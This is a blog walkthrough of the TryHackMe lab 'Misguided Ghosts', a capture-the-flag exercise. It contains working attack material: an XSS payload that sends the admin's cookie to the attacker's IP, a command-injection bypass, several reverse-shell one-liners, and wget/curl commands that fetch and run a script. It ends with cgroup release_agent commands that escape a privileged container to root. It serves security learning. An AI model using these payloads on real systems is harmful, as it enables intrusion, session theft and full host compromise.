---
title: "Misguided Ghosts TryHackMe Write Up"
last_modified_at: 2020-11-20T15:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - linux
  - wireshark
  - FTP
  - XSS
  - Command injection
  - privilege escalation
  - Port Knocking
  - docker escaping
  - misguided ghosts
  - Docker
---


<img alt="misguided" src="/assets/images/thm/misguided_ghosts/misguided_ghosts.png" width="200px" height="50px">

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

[Misguided Ghosts](https://tryhackme.com/room/misguidedghosts) is a hard rated room on TryHackMe by [JakeDoesSec](https://tryhackme.com/p/JakeDoesSec) and [bobloblaw](https://tryhackme.com/p/bobloblaw). It contains port knocking, reading packet capture file using wireshark, FTP enumeration, password guessing, XSS filter bypass, command injection filter bypass and escaping from privileged docker container.

# Port Scan
### Full Port Scan
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ nmap -p- --min-rate 10000 -oN nmap/allports 10.10.3.140
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-20 12:49 +0545
Nmap scan report for 10.10.3.140
Host is up (0.36s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
Nmap done: 1 IP address (1 host up) scanned in 34.18 seconds

```

### Detail Scan
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ nmap -sC -sV -oN nmap/initial 10.10.3.140
Nmap scan report for 10.10.3.140
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.31.213
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov  5 19:04:59 2020 -- 1 IP address (1 host up) scanned in 50.79 seconds
```
We have only two ports open, one being FTP on port 21 and another is SSH on port 22. It is a little weird that there are no any other services running on the server. As the anonymous login is enabled, lets check the contents of the FTP server.

# FTP on Port 21
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ ftp 10.10.3.140
Connected to 10.10.3.140.
220 (vsFTPd 3.0.3)
Name (10.10.3.140:local): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 18 18:32 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 18 18:32 ..
drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 18 18:32 ..
-rw-r--r--    1 ftp      ftp           103 Aug 28 18:11 info.txt
-rw-r--r--    1 ftp      ftp           248 Aug 26 18:51 jokes.txt
-rw-r--r--    1 ftp      ftp        737512 Aug 18 18:12 trace.pcapng
226 Directory send OK.
ftp> get info.txt
local: info.txt remote: info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for info.txt (103 bytes).
226 Transfer complete.
103 bytes received in 0.09 secs (1.1656 kB/s)
ftp> get jokes.txt
local: jokes.txt remote: jokes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for jokes.txt (248 bytes).
226 Transfer complete.
248 bytes received in 0.07 secs (3.4253 kB/s)
ftp> get trace.pcapng
local: trace.pcapng remote: trace.pcapng
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for trace.pcapng (737512 bytes).
226 Transfer complete.
737512 bytes received in 5.43 secs (132.5683 kB/s)
ftp> 
```
There were few files on the FTP server.

## Contents of info.txt
```console
local@local:~/Documents/tryhackme/misguided_ghosts/ftp$ cat info.txt 
I have included all the network info you requested, along with some of my favourite jokes.

- Paramore
```

## Contents of jokes.txt
```console
local@local:~/Documents/tryhackme/misguided_ghosts/ftp$ cat jokes.txt 
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!
```
Here are few knock knock jokes which is the hint that this room involves port knocking.
And we have a network capture file which we will analyse on wireshark.
## trace.pcapng
![1](/assets/images/thm/misguided_ghosts/1.png)
If we analyse the network capture, we can see the SYN packets being sent to the closed port which in response sends a ACK and RST flag. Sending packets to a closed port in a certain sequence so that some firewall rule is ran on the server is known as port knocking and with this network capture file we can obtain the secret port knocking sequence.

Using filters in wireshark, I have extracted the port knocking sequence.
![2](/assets/images/thm/misguided_ghosts/2.png)

## Code for port knocking
```bash
local@local:~/Documents/tryhackme/misguided_ghosts$ cat portknock.sh 
#!/bin/bash

telnet $1 7864
telnet $1 8273
telnet $1 9241
telnet $1 12007
telnet $1 60753
```
As the room was hard and I couldnot finish in a single try, I have written this little script for port knocking.
```bash
local@local:~/Documents/tryhackme/misguided_ghosts$ ./portknock.sh 10.10.3.140
Trying 10.10.3.140...
telnet: Unable to connect to remote host: Connection refused
Trying 10.10.3.140...
telnet: Unable to connect to remote host: Connection refused
Trying 10.10.3.140...
telnet: Unable to connect to remote host: Connection refused
Trying 10.10.3.140...
telnet: Unable to connect to remote host: Connection refused
Trying 10.10.3.140...
telnet: Unable to connect to remote host: Connection refused
```
Now, lets do a network scan if there are any new ports open.
### Full Port Scan
```console  
local@local:~/Documents/tryhackme/misguided_ghosts$ nmap -p- --min-rate 10000  10.10.3.140
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-20 13:29 +0545
Nmap scan report for 10.10.3.140
Host is up (0.36s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
8080/tcp  open     http-proxy
47361/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 35.09 seconds
```
We have a new port  open, i.e. 8080.

### Detail Scan
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ nmap -p 8080 -sC -sV 10.10.3.140
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-20 13:30 +0545
Nmap scan report for 10.10.3.140
Host is up (0.36s latency).

PORT     STATE SERVICE  VERSION
8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
|_http-title: Misguided Ghosts
| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN
| Not valid before: 2020-08-11T16:52:11
|_Not valid after:  2021-08-11T16:52:11
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.74 seconds
```
From the results of the nmap scan, we can see that the HTTPS sevice is running hosted on python and we also get a hostname ie misguided_hosts.thm.

# HTTPS on Port 8080
We get a error as the certificate is self signed and if we check the certificate we get a hostname and a email address.
![3](/assets/images/thm/misguided_ghosts/3.png)
```console
Common Name : misguided_ghosts.thm
Email Address : zac@misguided_ghosts.thm
```
### Home page
![4](/assets/images/thm/misguided_ghosts/4.png)
Only a image was on the homepage called hayley.png which I downloaded and checked the metadata with exiftool but there was not much useful information.

## Directory Bruteforce
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ gobuster dir -u https://10.10.3.140:8080/ -w wordlists -k 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.3.140:8080/
[+] Threads:        10
[+] Wordlist:       wordlists
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/20 13:39:15 Starting gobuster
===============================================================
/login (Status: 200)
/console (Status: 200)
/dashboard (Status: 302)
===============================================================
2020/11/20 13:39:24 Finished
===============================================================
```
As the directory bruteforce was very slow, I have used a custom wordlist here. During actual enumeration, I have used wordlists like common.txt, big.txt and directory-list-2.3-medium.txt and raft-medium-directories.txt from Seclist.

## Visiting /console
![5](/assets/images/thm/misguided_ghosts/5.png)
We get a python debug console but to actually unlock this debugger console we have to know the pin which we dont know.

### Visiting /dashboard
It redirects us to the login page.

### Visiting /login
![6](/assets/images/thm/misguided_ghosts/6.png)
I tried some default credentials like `admin:admin`, `admin:password` but they did not work. As the box was very very slow for some reason, SQLMap didnot work as expected. So, I checked manually if it was vulnerable to SQL injection, NoSQL injection,XPath injection and so on but didnot find anything. As the box was extremely slow, I was thinking bruteforce should not be an option here. So I took a step back and check all my findings and make a list of potential users.

```bash
Paramore                   # from info.txt on FTP server
Taylor and Josh            # Name on the  joke.txt and might not be the usernames
zac@misguided_ghosts.thm   # email from the certificate
```
This is all I had till now. So, I tried to login with username and passwords like paramore:paramore, josh:josh, zac:zac and so on. And I get in with **zac:zac**.

### Logging as zac
![7](/assets/images/thm/misguided_ghosts/7.png)
The dashboard says we can make a post and the admins will check that post every 2 minutes which gives us a hint for XSS attack. So, I started playing with the XSS, but it turned out few of the characters are blocked for preventing XSS.

![8](/assets/images/thm/misguided_ghosts/8.png)
Now, I started filtering out the blocked characters.

```console
local@local:~/Documents/tryhackme/misguided_ghosts$ wfuzz -w /usr/share/wordlists/SecLists-master/Fuzzing/special-chars.txt -d 'title=FUZZ&subtitle=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -p 127.0.0.1:8080 -b 'login=<redacted-zac-cookie>' --hh 1111 -u https://10.10.3.140:8080/dashboard
********************************************************
* Wfuzz 3.0.3 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.3.140:8080/dashboard
Total requests: 32

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                        
===================================================================

000000008:   200        47 L     89 W     1109 Ch     "& - &"                                                                                                        
000000032:   200        49 L     96 W     1167 Ch     "> - >"                                                                                                        
000000031:   200        49 L     96 W     1167 Ch     "< - <"                                                                                                        

Total time: 24.59667
Processed Requests: 32
Filtered Requests: 29
Requests/sec.: 1.300988

```
And looking at the response on the burp, the characters which triggered the firewall are < and >.
So to bypass this I used unicode hex character code.
```
<   ==  &#x3C;
>   ==  &#x3E;
```

### Update Post Request
Payload 
```html
&#x3C;script&#x3E; alert('xss') &#x3C;/script&#x3E;
```
![9](/assets/images/thm/misguided_ghosts/9.png)
We get what we are looking for, execpt the script is completely absent on the result.

### Hypothesis
```py
if '<' or '>' in title or subtitle:
    return 'Late for Bounty'
if 'script' in title or subtitle:
    remove script from title and subtitle
    return tile,subtitle
```
If my hypothesis is correct and if the checks for the script is done only once and not recursively, this check can be easily bypassed using **scrscriptipt**. When the loop is run once, it removes the middle script leaving us with another script.

## Making a new post request
### Updated Payload
```html
&#x3C;scrscriptipt&#x3E; alert('xss') &#x3C;/scscriptript&#x3E;
```
![10](/assets/images/thm/misguided_ghosts/10.png)
And this time we get a alert box saying XSS. Now that we can run javascript code on the admin's browser, we can get the admin's cookie.

### Request Payload
```html
&#x3C;scrscriptipt&#x3E; document.location='http://10.6.31.213:9001/XSS/grabber.php?c='+document.cookie  &#x3C;/scrscriptipt&#x3E;
```
### Listening on our box
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ nc -nvklp 9001
Listening on 0.0.0.0 9001
```

And After some time,we get a response back on the netcat listener with the admin cookie.

```console
local@local:~/Documents/tryhackme/misguided_ghosts$ nc -nvklp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.3.140 57934
GET /XSS/grabber.php?c=login=<redacted-admin-cookie> HTTP/1.1
Host: 10.6.31.213:9001
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```
Now that we have got an admin cookie, let update the cookies from the browser console and  login as admin.
### On browser console
```js
document.cookie = 'login=<redacted-admin-cookie>'
"login=<redacted-admin-cookie>"
```
![11](/assets/images/thm/misguided_ghosts/11.png)
Now we are logged    in as hayley. I looked around if there is any new admin functionality on the webserver but failed to find anything. Then I turned my focus on the locked console. I can see that the request was made from headlessChrome but I did not know whether or not the headless chrome stores the cookie or not. As the path **/console** is on the same origin as **/dashboard**, we can make an AJAX request to /console as hayley from the headlesschrome and if there are cookies for the domain, the browser attaches the cookie with the request and we can execute code on the debugger console.
I played with this thing for a long time. Even created a hello world app on flask to check the behaviour of the debugger console.


### Request payload
```html
&#x3C;scrscriptipt&#x3E; 
var res = '';                               
var req1 = new XMLHttpRequest();            
var params = '?__debugger__=yes&cmd=import%20os&frm=0&s=mi09o4WJvOxxlyqUAa1I';          
req1.open("GET","/console" + params,false);
req1.send();
res = res + ' Location: '+window.location.host +' Request -    Import os response code : ' + req1.status+ ' and the response is' + btoa(req1.responseText);

var req7 = new XMLHttpRequest();          
req7.open("POST",'/dashboard',true);
var params = "title=test&subtitle=" + res;
req7.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
req7.send(params);      

 &#x3C;/scrscriptipt&#x3E;
 ```
 What this script does is tries to import os on the console and makes a post request to the /dashboard enabling us to see the output.

### Response
```html
Location: localhost:8080 Request -    Import os response code : 404 and the response isPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDMuMiBGaW5hbC8vRU4iPgo8dGl0bGU NDA0IE5vdCBGb3VuZDwvdGl0bGU CjxoMT5Ob3QgRm91bmQ8L2gxPgo8cD5UaGUgcmVxdWVzdGVkIFVSTCB3YXMgbm90IGZvdW5kIG9uIHRoZSBzZXJ2ZXIuIElmIHlvdSBlbnRlcmVkIHRoZSBVUkwgbWFudWFsbHkgcGxlYXNlIGNoZWNrIHlvdXIgc3BlbGxpbmcgYW5kIHRyeSBhZ2Fpbi48L3A Cg==
```


 But this also didnot work as there were no cookies attached to the request which was giving us 404 on the response.
 Then I search around and found a [article](https://www.daehee.com/werkzeug-console-pin-exploit/) to generate the debugger pin for which we will be needing the mac address of the machine and the machine-id from /etc/machine-id of the machine. The thing is that we have the mac address of the machine from the network capture file but we do not have a LFI to read the files from the webserver. So being stuck on this for a long time I sent a message to the one of the creator of the box asking if the console exploit was the intended path and I got the reply that the console exploit is not the intended path and I should continue with the normal enumeration.

## Directory Bruteforce with the admin's cookie
 ```console
local@local:~/Documents/tryhackme/misguided_ghosts$ wfuzz -w wordlists -H 'Cookie: login=<redacted-admin-cookie>' --hc 404 -c https://10.10.8.31:8080/FUZZ
********************************************************
* Wfuzz 3.0.3 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.8.31:8080/FUZZ
Total requests: 7

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                        
===================================================================

000000007:   200        26 L     54 W     629 Ch      "photos"                                                                                                       
000000003:   200        52 L     186 W    1985 Ch     "console"                                                                                                      
000000005:   302        3 L      24 W     227 Ch      "login"                                                                                                        
000000004:   200        47 L     106 W    1516 Ch     "dashboard"                                                                                                    

Total time: 3.347206
Processed Requests: 7
Filtered Requests: 3
Requests/sec.: 2.091296

```
And with admin cookie, we get a new endpoint, ie /photos.

## Checking /photos
![12](/assets/images/thm/misguided_ghosts/12.png)
Looks like we can upload a file. So, lets upload a file.

## Uploading a file
I tried to upload a file that we created earlier called portknock.sh but the file didnot upload and the request made was a GET request with parameter name equal to the filename.
### Request
```html
GET /photos?image=portknock.sh HTTP/1.1
Host: 10.10.8.31:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://10.10.8.31:8080/photos
Cookie: login=<redacted-admin-cookie>
Upgrade-Insecure-Requests: 1
```
### Response
```html
cannot access 'portknock.sh': No such file or directory
```
It is kind of strange how it is implemented. Lets try to access /etc/passwd file.

### Request
```html
GET /photos?image=/etc/passwd HTTP/1.1
```

### Response
```html
<pre>
    /etc/passwd
</pre>
```
We get a filename back.
And I made a request with directory /etc/.

### Request with /etc/
```html
GET /photos?image=/etc/ HTTP/1.1
```

### Response
```html
<pre>alpine-release
apk
bindresvport.blacklist
ca-certificates
ca-certificates.conf
conf.d
crontabs
fstab
group
hostname
hosts
init.d
inittab
inputrc
issue
krb5.conf
logrotate.d
modprobe.d
modules
modules-load.d
motd
mtab
netconfig
network
opt
os-release
passwd
periodic
profile
profile.d
protocols
resolv.conf
securetty
services
shadow
shells
ssl
sysctl.conf
sysctl.d
terminfo
udhcpd.conf
</pre>
```
This time we get the content of the whole etc directory back.

### Hypothesis
I thought that the function implemented can not be os.listdir() as it errors out if we pass the filename.

```py
image = GET['image']              # Getting the user input
os.popen(f'ls {image}').read()    # Displaying the files
```
If this is implemented in this way without user input sanitization, we can inject the terminal commands here.

## Code execution
### Request
```html
GET /photos?image=/etc/passwd;id HTTP/1.1
```
### Response
```html
<pre>
    /etc/passwd
    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
</pre>
```
And we get the code execution on the box and we are running as root.

But we do have another problem here with spaces. It turned out the spaces are removed before they are passed into the popen function.

### Request
```html
GET /photos?image=/etc/passwd;ls+-la HTTP/1.1
```
### Response
```html
cannot access '/etc/passwd;ls-la': No such file or directory
```

So we have to find a way to bypass this check and I came across a article which makes use of hex representation of spaces to execute shell commands.

### Request Payload
```html
?image=/etc/passwd;CMD=$'\x20ping\x2010.6.31.213';`$CMD`
```

### Listening on our box for ICMP packets
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:04:00.310198 IP 10.10.8.31 > local: ICMP echo request, id 12288, seq 0, length 64
16:04:00.310264 IP local > 10.10.8.31: ICMP echo reply, id 12288, seq 0, length 64
16:04:01.310213 IP 10.10.8.31 > local: ICMP echo request, id 12288, seq 1, length 64
16:04:01.310298 IP local > 10.10.8.31: ICMP echo reply, id 12288, seq 1, length 64
16:04:02.310244 IP 10.10.8.31 > local: ICMP echo request, id 12288, seq 2, length 64
```
And we get the reply. Lets try and get a reverse shell. At first I will host a file called shell.sh on my local box with bunch of reverse shell payloads,download it on the remote box using wget and execute the file on next step.

### Content of shell.sh
```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.213 9001 >/tmp/f

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

bash -i >& /dev/tcp/10.6.31.213/9001 0>&1
```

### Serving a HTTP Server
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
### Making a request to get the file
```html
/photos?image=/etc/passwd;CMD=$'\x20wget\x2010.6.31.213:8000/shell.sh';`$CMD`
```
And if we check the python server, we get a request for file shell.sh
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.8.31 - - [20/Nov/2020 16:02:53] "GET /shell.sh HTTP/1.1" 200 -
```
Now lets run the script.

### Listening on the local box
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ nc -nvlp 9001
Listening on 0.0.0.0 9001
```

### Executing the payload 
```html
/photos?image=/etc/passwd;CMD=$'\x20sh\x20shell.sh';`$CMD`
```
And if we check the netcat listener, we get a shell back.

```console
local@local:~/Documents/tryhackme/misguided_ghosts$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.174.16 39069
/bin/sh: can't access tty; job control turned off
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
We are already root but on the docker container. So, we have to find a way to be a root user on the host device.

# Privilege Escalation
### Checking content inside /app
```console
/app # ls -la
total 60
drwxr-xr-x    1 root     root          4096 Nov 20 10:32 .
drwxr-xr-x    1 root     root          4096 Nov 20 10:32 ..
drwxr-xr-x    8 root     root          4096 Aug 11 15:30 .git
-rw-r--r--    1 root     root          1045 Aug 11 15:30 .gitignore
-rw-r--r--    1 root     root           188 Aug 11 15:30 .travis.yml
-rw-r--r--    1 root     root           170 Aug 18 18:43 Dockerfile
-rw-r--r--    1 root     root          3260 Aug 27 21:28 app.py
-rw-r--r--    1 root     root          2187 Aug 11 16:52 cert.pem
-rw-------    1 root     root          3272 Aug 11 16:50 key.pem
-rw-r--r--    1 root     root            14 Aug 11 15:30 requirements.txt
-rw-r--r--    1 root     root           581 Nov 20 10:32 shell.sh
-rwxr-xr-x    1 root     root           222 Aug 26 19:13 start.sh
drwxr-xr-x    5 root     root          4096 Aug 28 18:13 static
-rwxr-xr-x    1 root     root            92 Aug 26 19:13 stop.sh
drwxr-xr-x    2 root     root          4096 Aug 28 19:00 templates
```
Here we can see the content of the webserver. And I started checking the contents of all the files and I found something interesting on start.sh.

### Content of start.sh
```console
/app # cat start.sh
#!/bin/bash

/usr/bin/docker build -t https /var/www/https

/usr/bin/docker container run --detach --privileged --restart=unless-stopped -p 8080:8080 --mount type=bind,source="/home/zac/notes",target=/home/zac/notes https
```
Here the container is started on privileged mode and the /home/zac/notes of the host machine is mounted on the /home/zac/notes of the target machine.

### Contents of /home/zac/notes
```console
/app # cd /home/zac/notes
/home/zac/notes # ls -la
total 16
drwxrwxr-x    2 1001     1001          4096 Aug 26 02:11 .
drwxr-xr-x    3 root     root          4096 Nov 20 10:32 ..
-rw-r--r--    1 1001     1002          1675 Aug 25 00:14 .id_rsa
-rw-r--r--    1 1001     1002           270 Aug 25 00:34 .secret
```
We have two hidden files. One looks like a private key for user zac and another is a file named secret.

### Content of .secret
```console
/home/zac/notes # cat .secret
Zac,

I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.

- Paramore
```
### Content of .id_rsa
```console
/home/zac/notes # cat .id_rsa
-----BEGIN RSA PRIVATE KEY-----
NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
CgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq
0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6
aJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0
TwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW
QQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG
a60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL
4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o
DIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY
cXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe
gYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj
mwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq
wf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1
A1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp
VU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n
ddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut
oOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB
LCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA
H6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA
M5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys
vgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc
eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema
r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
-----END RSA PRIVATE KEY-----
```
The note says the key is ciphered and the user zac knows how to get the key. I tried this for a while and left because this looked like a rabbit hole to keep the attackers occupied with something that is useless but takes a lot of the attackers time.

### Escaping from privileged docker containers
If the docker containers are run with -privileged flag, it is possible to run commands on the host. This [post](https://vickieli.dev/system%20security/escape-docker/) explains why that happens and also has a list of commands to run to get code execution.

### Commands on the blog
```console
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
We just have to put the commands we want to run on the /cmd.

# Getting a root shell on the host
### Listening on our local box
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ nc -nvlp 9001
Listening on 0.0.0.0 9001
```

### Exploit
```console
/home/zac/notes # mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
/home/zac/notes # echo 1 > /tmp/cgrp/x/notify_on_release
/home/zac/notes # host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
/home/zac/notes # echo "$host_path/cmd" > /tmp/cgrp/release_agent
/home/zac/notes # echo '#!/bin/sh' > /cmd
/home/zac/notes # echo 'curl 10.6.31.213:8000/shell.sh -o /dev/shm/shell.sh' >> /cmd
/home/zac/notes # echo 'chmod +x /dev/shm/shell.sh' >> /cmd
/home/zac/notes # echo 'sh /dev/shm/shell.sh' >> /cmd
/home/zac/notes # chmod a+x /cmd
/home/zac/notes # sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
Here we get a file called shell.sh which contains few reverse shell payloads from our local box using curl, save the file on /dev/shm/, make it executable and run the file.

And if we check the netcat listener
```console
local@local:~/Documents/tryhackme/misguided_ghosts$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.174.16 58312
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /etc/hostname
misguided_ghosts
```
We get a shell as root on the host box.

## Reading the root flag
```console
# cat /root/root.txt
{p1**************n}
```